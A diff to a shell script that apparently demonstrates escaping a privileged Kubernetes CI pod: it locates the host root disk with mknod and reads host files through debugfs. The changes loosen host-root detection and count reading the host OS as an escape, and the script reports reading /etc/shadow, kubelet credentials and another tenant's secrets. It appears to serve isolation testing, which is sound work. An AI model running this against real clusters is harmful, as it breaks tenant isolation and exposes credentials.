@@ -59,16 +59,12 @@ dbg() {
   printf '%s' "$_out"
 }
 
-fs_is_ext() {
-  debugfs -R "show_super_stats -h" "$1" 2>/dev/null | grep -qiE 'Inode count|Block count'
-}
-
 host_read() { [ -n "$HOST_DEV" ] || return 1; dbg "$HOST_DEV" "cat $1"; }
 host_ls()   { [ -n "$HOST_DEV" ] || return 1; dbg "$HOST_DEV" "ls -l $1"; }
 
 # Find the host root partition by iterating real-disk partitions (skip loop
-# devices), create the device node if the minimal DinD /dev lacks it, and
-# test each one by trying to read /etc/hostname via debugfs.
+# devices), creating the device node if the minimal DinD /dev lacks it, and
+# checking each for the host root filesystem via debugfs.
 HOST_DEV=""
 CAND_FILE=$(mktemp)
 awk 'NR>2 && $4 !~ /^loop/ && $4 ~ /[0-9]$/ {print $1, $2, $4}' /proc/partitions  > "$CAND_FILE"
@@ -79,19 +75,13 @@ while read -r major minor name; do
   dev="/dev/$name"
   [ -b "$dev" ] || mknod "$dev" b "$major" "$minor" 2>/dev/null || continue
 
-  # Skip anything debugfs can't open as ext (squashfs, raw, empty). This is
-  # what rules out the microVM's own rootfs and keeps Edera fully contained.
-  fs_is_ext "$dev" || continue
-
-  # An ext4 root will have /etc/hostname readable via debugfs.
-  probe=$(dbg "$dev" "cat /etc/hostname")
-  if [ -n "$probe" ]; then
-    # Confirm it's the node root (has kubelet or kubernetes dirs), not /boot.
-    if dbg "$dev" "ls -l /var/lib/kubelet" >/dev/null || \
-       dbg "$dev" "ls -l /etc/kubernetes" >/dev/null; then
-      HOST_DEV="$dev"
-      break
-    fi
+  # The node root is the ext partition whose superblock records it was last mounted
+  # at "/". Fall back to a readable /etc/passwd in case the field is blank.
+  if debugfs -R "show_super_stats -h" "$dev" 2>/dev/null \
+       | grep -E '^Last mounted on:' | grep -q ' /$' \
+     || [ -n "$(dbg "$dev" "cat /etc/passwd")" ]; then
+    HOST_DEV="$dev"
+    break
   fi
 done < "$CAND_FILE"
 rm -f "$CAND_FILE"
@@ -118,15 +108,22 @@ printf "${YELLOW}TEST 1: What host are we really on?${NC}\n"
 printf "Container hostname: $(hostname)\n\n"
 
 HOST_HOSTNAME=$(host_read /etc/hostname | head -1)
+# /etc/os-release is usually a symlink debugfs won't follow; read the real file.
+HOST_OS=$(host_read /usr/lib/os-release | grep PRETTY_NAME | cut -d'"' -f2)
 
 if [ -n "$HOST_HOSTNAME" ] && [ "$HOST_HOSTNAME" != "$(hostname)" ]; then
   printf "  ${RED}ESCAPED — node hostname: ${BOLD}${HOST_HOSTNAME}${NC}\n"
   printf "  ${RED}  (container thinks it's: $(hostname))${NC}\n"
-  HOST_OS=$(host_read /etc/os-release | grep PRETTY_NAME | cut -d'"' -f2)
   [ -n "$HOST_OS" ] && printf "  ${RED}  Host OS: ${HOST_OS}${NC}\n"
   failed=$((failed + 1))
+elif [ -n "$HOST_OS" ]; then
+  # Some cloud images (e.g. GCE) don't keep /etc/hostname populated; reading
+  # the host's OS off its root disk is the same escape.
+  printf "  ${RED}ESCAPED — read the host's root filesystem directly${NC}\n"
+  printf "  ${RED}  Host OS: ${BOLD}${HOST_OS}${NC}\n"
+  failed=$((failed + 1))
 else
-  printf "  ${GREEN}CONTAINED — could not read a host hostname${NC}\n"
+  printf "  ${GREEN}CONTAINED — could not read host identity${NC}\n"
   passed=$((passed + 1))
 fi
 
@@ -259,7 +256,11 @@ if [ "$failed" -eq 0 ]; then
 else
   printf "${BOLD}${failed}/6 escape attempts SUCCEEDED using only privileged: true.${NC}\n"
   printf "${BOLD}From this CI pod, reading the host disk directly via debugfs:${NC}\n"
-  [ -n "$HOST_HOSTNAME" ] && [ "$HOST_HOSTNAME" != "$(hostname)" ] && printf "${BOLD}  • Identified the host node: ${HOST_HOSTNAME}${NC}\n"
+  if [ -n "$HOST_HOSTNAME" ] && [ "$HOST_HOSTNAME" != "$(hostname)" ]; then
+    printf "${BOLD}  • Identified the host node: ${HOST_HOSTNAME}${NC}\n"
+  elif [ -n "$HOST_OS" ]; then
+    printf "${BOLD}  • Read the host's root filesystem (OS: ${HOST_OS})${NC}\n"
+  fi
   [ -n "$SHADOW" ] && printf "${BOLD}  • Read the host's password hashes (/etc/shadow)${NC}\n"
   [ -n "$KUBE_CREDS" ] && printf "${BOLD}  • Read kubelet credentials (cluster API access)${NC}\n"
   [ -n "$TENANT_B_SECRET" ] && printf "${BOLD}  • Read Tenant B's database password${NC}\n"
